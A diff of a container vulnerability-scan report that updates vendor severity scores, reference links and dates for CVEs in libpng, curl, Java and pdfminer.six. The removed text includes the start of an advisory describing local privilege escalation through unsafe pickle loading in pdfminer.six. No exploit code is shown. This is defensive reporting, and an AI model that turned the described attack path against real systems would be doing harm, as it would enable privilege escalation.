@@ -13325,7 +13325,7 @@
 │                       │       │                  │       6d0040afb6 
 │                       │       │                  ├ [11]: https://hackerone.com/reports/3294999 
 │                       │       │                  ├ [12]: https://linux.oracle.com/cve/CVE-2025-9086.html 
-│                       │       │                  ├ [13]: https://linux.oracle.com/errata/ELSA-2026-1350.html 
+│                       │       │                  ├ [13]: https://linux.oracle.com/errata/ELSA-2026-1825.html 
 │                       │       │                  ├ [14]: https://lists.debian.org/debian-lts-announce/2026/01
 │                       │       │                  │       /msg00002.html 
 │                       │       │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2025-9086 
@@ -14162,6 +14162,7 @@
 │                       │       ├ Severity        : CRITICAL 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 4 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 4 
 │                       │       │                  ├ redhat     : 3 
@@ -14451,6 +14452,7 @@
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-476 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ nvd        : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 3 
@@ -14731,6 +14733,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-476 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -15016,6 +15019,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-789 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -15149,6 +15153,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -15285,6 +15290,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-325 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -15426,6 +15432,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-754 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 3 
 │                       │       │                  ├ redhat     : 1 
@@ -16261,7 +16268,7 @@
 │                       │       │                  │       6d0040afb6 
 │                       │       │                  ├ [11]: https://hackerone.com/reports/3294999 
 │                       │       │                  ├ [12]: https://linux.oracle.com/cve/CVE-2025-9086.html 
-│                       │       │                  ├ [13]: https://linux.oracle.com/errata/ELSA-2026-1350.html 
+│                       │       │                  ├ [13]: https://linux.oracle.com/errata/ELSA-2026-1825.html 
 │                       │       │                  ├ [14]: https://lists.debian.org/debian-lts-announce/2026/01
 │                       │       │                  │       /msg00002.html 
 │                       │       │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2025-9086 
@@ -16486,7 +16493,7 @@
 │                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-25210 
 │                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-25210 
 │                       │       ├ PublishedDate   : 2026-01-30T07:16:15.57Z 
-│                       │       ╰ LastModifiedDate: 2026-01-30T07:16:15.57Z 
+│                       │       ╰ LastModifiedDate: 2026-02-04T16:34:21.763Z 
 │                       ├ [47]  ╭ VulnerabilityID : CVE-2025-64720 
 │                       │       ├ PkgID           : libpng@1.6.49-r0 
 │                       │       ├ PkgName         : libpng 
@@ -17009,6 +17016,7 @@
 │                       │       ├ Severity        : CRITICAL 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 4 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 4 
 │                       │       │                  ├ redhat     : 3 
@@ -17298,6 +17306,7 @@
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-476 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ nvd        : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 3 
@@ -17578,6 +17587,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-476 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -17863,6 +17873,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-789 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -17996,6 +18007,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -18132,6 +18144,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-325 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -18273,6 +18286,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-754 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 3 
 │                       │       │                  ├ redhat     : 1 
@@ -18978,14 +18992,23 @@
 │                       │       │                   impacts).  CVSS Vector:
 │                       │       │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N). 
 │                       │       ├ Severity        : HIGH 
-│                       │       ├ VendorSeverity   ─ redhat: 3 
+│                       │       ├ VendorSeverity   ╭ redhat: 3 
+│                       │       │                  ╰ ubuntu: 2 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:
 │                       │       │                           │           H/A:N 
 │                       │       │                           ╰ V3Score : 7.4 
-│                       │       ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-21932 
-│                       │       │                  ├ [1]: https://nvd.nist.gov/vuln/detail/CVE-2026-21932 
-│                       │       │                  ├ [2]: https://www.cve.org/CVERecord?id=CVE-2026-21932 
-│                       │       │                  ╰ [3]: https://www.oracle.com/security-alerts/cpujan2026.html 
+│                       │       ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2026-21932 
+│                       │       │                  ├ [1] : https://nvd.nist.gov/vuln/detail/CVE-2026-21932 
+│                       │       │                  ├ [2] : https://ubuntu.com/security/notices/USN-7995-1 
+│                       │       │                  ├ [3] : https://ubuntu.com/security/notices/USN-7996-1 
+│                       │       │                  ├ [4] : https://ubuntu.com/security/notices/USN-7997-1 
+│                       │       │                  ├ [5] : https://ubuntu.com/security/notices/USN-7998-1 
+│                       │       │                  ├ [6] : https://ubuntu.com/security/notices/USN-8000-1 
+│                       │       │                  ├ [7] : https://ubuntu.com/security/notices/USN-8001-1 
+│                       │       │                  ├ [8] : https://ubuntu.com/security/notices/USN-8002-1 
+│                       │       │                  ├ [9] : https://ubuntu.com/security/notices/USN-8003-1 
+│                       │       │                  ├ [10]: https://www.cve.org/CVERecord?id=CVE-2026-21932 
+│                       │       │                  ╰ [11]: https://www.oracle.com/security-alerts/cpujan2026.html 
 │                       │       ├ PublishedDate   : 2026-01-20T22:15:55.793Z 
 │                       │       ╰ LastModifiedDate: 2026-01-30T16:08:39.917Z 
 │                       ├ [71]  ╭ VulnerabilityID : CVE-2026-21945 
@@ -19036,7 +19059,8 @@
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ redhat     : 3 
-│                       │       │                  ╰ rocky      : 3 
+│                       │       │                  ├ rocky      : 3 
+│                       │       │                  ╰ ubuntu     : 2 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
 │                       │       │                           │           N/A:H 
 │                       │       │                           ╰ V3Score : 7.5 
@@ -19062,8 +19086,16 @@
 │                       │       │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-21945.html 
 │                       │       │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-0932.html 
 │                       │       │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-21945 
-│                       │       │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-21945 
-│                       │       │                  ╰ [18]: https://www.oracle.com/security-alerts/cpujan2026.html 
+│                       │       │                  ├ [17]: https://ubuntu.com/security/notices/USN-7995-1 
+│                       │       │                  ├ [18]: https://ubuntu.com/security/notices/USN-7996-1 
+│                       │       │                  ├ [19]: https://ubuntu.com/security/notices/USN-7997-1 
+│                       │       │                  ├ [20]: https://ubuntu.com/security/notices/USN-7998-1 
+│                       │       │                  ├ [21]: https://ubuntu.com/security/notices/USN-8000-1 
+│                       │       │                  ├ [22]: https://ubuntu.com/security/notices/USN-8001-1 
+│                       │       │                  ├ [23]: https://ubuntu.com/security/notices/USN-8002-1 
+│                       │       │                  ├ [24]: https://ubuntu.com/security/notices/USN-8003-1 
+│                       │       │                  ├ [25]: https://www.cve.org/CVERecord?id=CVE-2026-21945 
+│                       │       │                  ╰ [26]: https://www.oracle.com/security-alerts/cpujan2026.html 
 │                       │       ├ PublishedDate   : 2026-01-20T22:15:57.39Z 
 │                       │       ╰ LastModifiedDate: 2026-01-30T16:03:26.53Z 
 │                       ├ [72]  ╭ VulnerabilityID : CVE-2025-53057 
@@ -19291,7 +19323,8 @@
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ redhat     : 2 
-│                       │       │                  ╰ rocky      : 3 
+│                       │       │                  ├ rocky      : 3 
+│                       │       │                  ╰ ubuntu     : 2 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:
 │                       │       │                           │           L/A:N 
 │                       │       │                           ╰ V3Score : 4.8 
@@ -19317,8 +19350,16 @@
 │                       │       │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-21925.html 
 │                       │       │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-0932.html 
 │                       │       │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-21925 
-│                       │       │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-21925 
-│                       │       │                  ╰ [18]: https://www.oracle.com/security-alerts/cpujan2026.html 
+│                       │       │                  ├ [17]: https://ubuntu.com/security/notices/USN-7995-1 
+│                       │       │                  ├ [18]: https://ubuntu.com/security/notices/USN-7996-1 
+│                       │       │                  ├ [19]: https://ubuntu.com/security/notices/USN-7997-1 
+│                       │       │                  ├ [20]: https://ubuntu.com/security/notices/USN-7998-1 
+│                       │       │                  ├ [21]: https://ubuntu.com/security/notices/USN-8000-1 
+│                       │       │                  ├ [22]: https://ubuntu.com/security/notices/USN-8001-1 
+│                       │       │                  ├ [23]: https://ubuntu.com/security/notices/USN-8002-1 
+│                       │       │                  ├ [24]: https://ubuntu.com/security/notices/USN-8003-1 
+│                       │       │                  ├ [25]: https://www.cve.org/CVERecord?id=CVE-2026-21925 
+│                       │       │                  ╰ [26]: https://www.oracle.com/security-alerts/cpujan2026.html 
 │                       │       ├ PublishedDate   : 2026-01-20T22:15:54.917Z 
 │                       │       ╰ LastModifiedDate: 2026-01-30T16:11:07.073Z 
 │                       ├ [75]  ╭ VulnerabilityID : CVE-2026-21933 
@@ -19377,7 +19418,8 @@
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ redhat     : 2 
-│                       │       │                  ╰ rocky      : 3 
+│                       │       │                  ├ rocky      : 3 
+│                       │       │                  ╰ ubuntu     : 2 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:
 │                       │       │                           │           L/A:N 
 │                       │       │                           ╰ V3Score : 6.1 
@@ -19403,8 +19445,16 @@
 │                       │       │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-21933.html 
 │                       │       │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-0932.html 
 │                       │       │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-21933 
-│                       │       │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-21933 
-│                       │       │                  ╰ [18]: https://www.oracle.com/security-alerts/cpujan2026.html 
+│                       │       │                  ├ [17]: https://ubuntu.com/security/notices/USN-7995-1 
+│                       │       │                  ├ [18]: https://ubuntu.com/security/notices/USN-7996-1 
+│                       │       │                  ├ [19]: https://ubuntu.com/security/notices/USN-7997-1 
+│                       │       │                  ├ [20]: https://ubuntu.com/security/notices/USN-7998-1 
+│                       │       │                  ├ [21]: https://ubuntu.com/security/notices/USN-8000-1 
+│                       │       │                  ├ [22]: https://ubuntu.com/security/notices/USN-8001-1 
+│                       │       │                  ├ [23]: https://ubuntu.com/security/notices/USN-8002-1 
+│                       │       │                  ├ [24]: https://ubuntu.com/security/notices/USN-8003-1 
+│                       │       │                  ├ [25]: https://www.cve.org/CVERecord?id=CVE-2026-21933 
+│                       │       │                  ╰ [26]: https://www.oracle.com/security-alerts/cpujan2026.html 
 │                       │       ├ PublishedDate   : 2026-01-20T22:15:55.917Z 
 │                       │       ╰ LastModifiedDate: 2026-01-30T16:07:09.417Z 
 │                       ├ [76]  ╭ VulnerabilityID : CVE-2025-61748 
@@ -19537,14 +19587,23 @@
 │                       │       │                   impacts).  CVSS Vector:
 │                       │       │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N). 
 │                       │       ├ Severity        : HIGH 
-│                       │       ├ VendorSeverity   ─ redhat: 3 
+│                       │       ├ VendorSeverity   ╭ redhat: 3 
+│                       │       │                  ╰ ubuntu: 2 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:
 │                       │       │                           │           H/A:N 
 │                       │       │                           ╰ V3Score : 7.4 
-│                       │       ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-21932 
-│                       │       │                  ├ [1]: https://nvd.nist.gov/vuln/detail/CVE-2026-21932 
-│                       │       │                  ├ [2]: https://www.cve.org/CVERecord?id=CVE-2026-21932 
-│                       │       │                  ╰ [3]: https://www.oracle.com/security-alerts/cpujan2026.html 
+│                       │       ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2026-21932 
+│                       │       │                  ├ [1] : https://nvd.nist.gov/vuln/detail/CVE-2026-21932 
+│                       │       │                  ├ [2] : https://ubuntu.com/security/notices/USN-7995-1 
+│                       │       │                  ├ [3] : https://ubuntu.com/security/notices/USN-7996-1 
+│                       │       │                  ├ [4] : https://ubuntu.com/security/notices/USN-7997-1 
+│                       │       │                  ├ [5] : https://ubuntu.com/security/notices/USN-7998-1 
+│                       │       │                  ├ [6] : https://ubuntu.com/security/notices/USN-8000-1 
+│                       │       │                  ├ [7] : https://ubuntu.com/security/notices/USN-8001-1 
+│                       │       │                  ├ [8] : https://ubuntu.com/security/notices/USN-8002-1 
+│                       │       │                  ├ [9] : https://ubuntu.com/security/notices/USN-8003-1 
+│                       │       │                  ├ [10]: https://www.cve.org/CVERecord?id=CVE-2026-21932 
+│                       │       │                  ╰ [11]: https://www.oracle.com/security-alerts/cpujan2026.html 
 │                       │       ├ PublishedDate   : 2026-01-20T22:15:55.793Z 
 │                       │       ╰ LastModifiedDate: 2026-01-30T16:08:39.917Z 
 │                       ├ [78]  ╭ VulnerabilityID : CVE-2026-21945 
@@ -19595,7 +19654,8 @@
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ redhat     : 3 
-│                       │       │                  ╰ rocky      : 3 
+│                       │       │                  ├ rocky      : 3 
+│                       │       │                  ╰ ubuntu     : 2 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
 │                       │       │                           │           N/A:H 
 │                       │       │                           ╰ V3Score : 7.5 
@@ -19621,8 +19681,16 @@
 │                       │       │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-21945.html 
 │                       │       │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-0932.html 
 │                       │       │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-21945 
-│                       │       │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-21945 
-│                       │       │                  ╰ [18]: https://www.oracle.com/security-alerts/cpujan2026.html 
+│                       │       │                  ├ [17]: https://ubuntu.com/security/notices/USN-7995-1 
+│                       │       │                  ├ [18]: https://ubuntu.com/security/notices/USN-7996-1 
+│                       │       │                  ├ [19]: https://ubuntu.com/security/notices/USN-7997-1 
+│                       │       │                  ├ [20]: https://ubuntu.com/security/notices/USN-7998-1 
+│                       │       │                  ├ [21]: https://ubuntu.com/security/notices/USN-8000-1 
+│                       │       │                  ├ [22]: https://ubuntu.com/security/notices/USN-8001-1 
+│                       │       │                  ├ [23]: https://ubuntu.com/security/notices/USN-8002-1 
+│                       │       │                  ├ [24]: https://ubuntu.com/security/notices/USN-8003-1 
+│                       │       │                  ├ [25]: https://www.cve.org/CVERecord?id=CVE-2026-21945 
+│                       │       │                  ╰ [26]: https://www.oracle.com/security-alerts/cpujan2026.html 
 │                       │       ├ PublishedDate   : 2026-01-20T22:15:57.39Z 
 │                       │       ╰ LastModifiedDate: 2026-01-30T16:03:26.53Z 
 │                       ├ [79]  ╭ VulnerabilityID : CVE-2025-53057 
@@ -19850,7 +19918,8 @@
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ redhat     : 2 
-│                       │       │                  ╰ rocky      : 3 
+│                       │       │                  ├ rocky      : 3 
+│                       │       │                  ╰ ubuntu     : 2 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:
 │                       │       │                           │           L/A:N 
 │                       │       │                           ╰ V3Score : 4.8 
@@ -19876,8 +19945,16 @@
 │                       │       │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-21925.html 
 │                       │       │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-0932.html 
 │                       │       │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-21925 
-│                       │       │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-21925 
-│                       │       │                  ╰ [18]: https://www.oracle.com/security-alerts/cpujan2026.html 
+│                       │       │                  ├ [17]: https://ubuntu.com/security/notices/USN-7995-1 
+│                       │       │                  ├ [18]: https://ubuntu.com/security/notices/USN-7996-1 
+│                       │       │                  ├ [19]: https://ubuntu.com/security/notices/USN-7997-1 
+│                       │       │                  ├ [20]: https://ubuntu.com/security/notices/USN-7998-1 
+│                       │       │                  ├ [21]: https://ubuntu.com/security/notices/USN-8000-1 
+│                       │       │                  ├ [22]: https://ubuntu.com/security/notices/USN-8001-1 
+│                       │       │                  ├ [23]: https://ubuntu.com/security/notices/USN-8002-1 
+│                       │       │                  ├ [24]: https://ubuntu.com/security/notices/USN-8003-1 
+│                       │       │                  ├ [25]: https://www.cve.org/CVERecord?id=CVE-2026-21925 
+│                       │       │                  ╰ [26]: https://www.oracle.com/security-alerts/cpujan2026.html 
 │                       │       ├ PublishedDate   : 2026-01-20T22:15:54.917Z 
 │                       │       ╰ LastModifiedDate: 2026-01-30T16:11:07.073Z 
 │                       ├ [82]  ╭ VulnerabilityID : CVE-2026-21933 
@@ -19936,7 +20013,8 @@
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ redhat     : 2 
-│                       │       │                  ╰ rocky      : 3 
+│                       │       │                  ├ rocky      : 3 
+│                       │       │                  ╰ ubuntu     : 2 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:
 │                       │       │                           │           L/A:N 
 │                       │       │                           ╰ V3Score : 6.1 
@@ -19962,8 +20040,16 @@
 │                       │       │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-21933.html 
 │                       │       │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-0932.html 
 │                       │       │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-21933 
-│                       │       │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-21933 
-│                       │       │                  ╰ [18]: https://www.oracle.com/security-alerts/cpujan2026.html 
+│                       │       │                  ├ [17]: https://ubuntu.com/security/notices/USN-7995-1 
+│                       │       │                  ├ [18]: https://ubuntu.com/security/notices/USN-7996-1 
+│                       │       │                  ├ [19]: https://ubuntu.com/security/notices/USN-7997-1 
+│                       │       │                  ├ [20]: https://ubuntu.com/security/notices/USN-7998-1 
+│                       │       │                  ├ [21]: https://ubuntu.com/security/notices/USN-8000-1 
+│                       │       │                  ├ [22]: https://ubuntu.com/security/notices/USN-8001-1 
+│                       │       │                  ├ [23]: https://ubuntu.com/security/notices/USN-8002-1 
+│                       │       │                  ├ [24]: https://ubuntu.com/security/notices/USN-8003-1 
+│                       │       │                  ├ [25]: https://www.cve.org/CVERecord?id=CVE-2026-21933 
+│                       │       │                  ╰ [26]: https://www.oracle.com/security-alerts/cpujan2026.html 
 │                       │       ├ PublishedDate   : 2026-01-20T22:15:55.917Z 
 │                       │       ╰ LastModifiedDate: 2026-01-30T16:07:09.417Z 
 │                       ├ [83]  ╭ VulnerabilityID : CVE-2025-61748 
@@ -20108,6 +20194,7 @@
 │                       │       ├ Severity        : CRITICAL 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 4 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 4 
 │                       │       │                  ├ redhat     : 3 
@@ -20397,6 +20484,7 @@
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-476 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ nvd        : 3 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 3 
@@ -20677,6 +20765,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-476 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -20962,6 +21051,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-789 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -21095,6 +21185,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -21231,6 +21322,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-325 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 2 
 │                       │       │                  ├ redhat     : 1 
@@ -21372,6 +21464,7 @@
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-754 
 │                       │       ├ VendorSeverity   ╭ alma       : 3 
+│                       │       │                  ├ azure      : 2 
 │                       │       │                  ├ oracle-oval: 3 
 │                       │       │                  ├ photon     : 3 
 │                       │       │                  ├ redhat     : 1 
@@ -25488,7 +25581,8 @@
 │                       │     │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-64512 
 │                       │     ├ PublishedDate   : 2025-11-10T22:15:40.067Z 
 │                       │     ╰ LastModifiedDate: 2026-01-08T22:16:02.24Z 
-│                       ├ [1] ╭ VulnerabilityID : GHSA-f83h-ghpp-7wcc 
+│                       ├ [1] ╭ VulnerabilityID : CVE-2025-70559 
+│                       │     ├ VendorIDs        ─ [0]: GHSA-f83h-ghpp-7wcc 
 │                       │     ├ PkgName         : pdfminer.six 
 │                       │     ├ PkgPath         : opt/scancode-toolkit/lib/python3.12/site-packages/pdfminer_si
 │                       │     │                   x-20250506.dist-info/METADATA 
@@ -25502,252 +25596,37 @@
 │                       │     │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7c
 │                       │     │                            7d38461b41e40aab9e7 
 │                       │     ├ SeveritySource  : ghsa 
-│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-f83h-ghpp-7wcc 
+│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-70559 
 │                       │     ├ DataSource       ╭ ID  : ghsa 
 │                       │     │                  ├ Name: GitHub Security Advisory pip 
 │                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
 │                       │     │                          osystem%3Apip 
-│                       │     ├ Fingerprint     : sha256:256650f36399178be995d8143f9ef9bb8810fdf66991c44b09e087
-│                       │     │                   58a1f4e111 
-│                       │     ├ Title           : Insecure Deserialization (pickle) in pdfminer.six CMap Loader
-│                       │     │                    — Local Privesc 
-│                       │     ├ Description     : ### 🚀 Overview
-│                       │     │                   
-│                       │     │                   This report **demonstrates a real-world privilege
-│                       │     │                   escalation** vulnerability in
-│                       │     │                   [pdfminer.six](https://github.com/pdfminer/pdfminer.six) due
-│                       │     │                   to unsafe usage of Python's `pickle` module for CMap file
-│                       │     │                   loading.
-│                       │     │                   It shows how a low-privileged user can gain root access (or
-│                       │     │                   escalate to any service account) by exploiting insecure
-│                       │     │                   deserialization in a typical multi-user or server
-│                       │     │                   environment.
-│                       │     │                   ![line](https://user-images.githubusercontent.com/74038190/21
-│                       │     │                   2284100-561aa473-3905-4a80-b561-0d28506553ee.gif)
-│                       │     │                   ## 🚨 Special Note
-│                       │     │                   This advisory addresses a distinct vulnerability from
-│                       │     │                   [GHSA-wf5f-4jwr-ppcp
-│                       │     │                   (CVE-2025-64512)](https://github.com/pdfminer/pdfminer.six/se
-│                       │     │                   curity/advisories/GHSA-wf5f-4jwr-ppcp).
-│                       │     │                   While the previous CVE claims to mitigate issues related to
-│                       │     │                   unsafe deserialization, the patch introduced in commit
-│                       │     │                   [b808ee05dd7f0c8ea8ec34bdf394d40e63501086](https://github.com
-│                       │     │                   /pdfminer/pdfminer.six/commit/b808ee05dd7f0c8ea8ec34bdf394d40
-│                       │     │                   e63501086) does not address the vulnerability reported here.
-│                       │     │                   Based on testing performed against the latest version of the
-│                       │     │                   library ([comparison
-│                       │     │                   view](https://github.com/pdfminer/pdfminer.six/compare/202505
-│                       │     │                   06...20251107)), the issue remains exploitable through local
-│                       │     │                   privilege escalation due to continued unsafe use of pickle
-│                       │     │                   files. The **Dockerfile** is hence modified to run test
-│                       │     │                   against this claim.
-│                       │     │                   This demonstrates that the patch for **CVE-2025-64512** is
-│                       │     │                   incomplete: the vulnerability remains exploitable. This
-│                       │     │                   advisory therefore documents a distinct, independently
-│                       │     │                   fixable flaw. A correct remediation must remove the
-│                       │     │                   dependency on pickle files (or otherwise eliminate unsafe
-│                       │     │                   deserialization) and replace it with a safe, auditable
-│                       │     │                   data-handling approach so the library can operate normally
-│                       │     │                   without relying on ```pickle```
-│                       │     │                   ## 📚 Table of Contents
-│                       │     │                   - [🔍 Background](#-background)
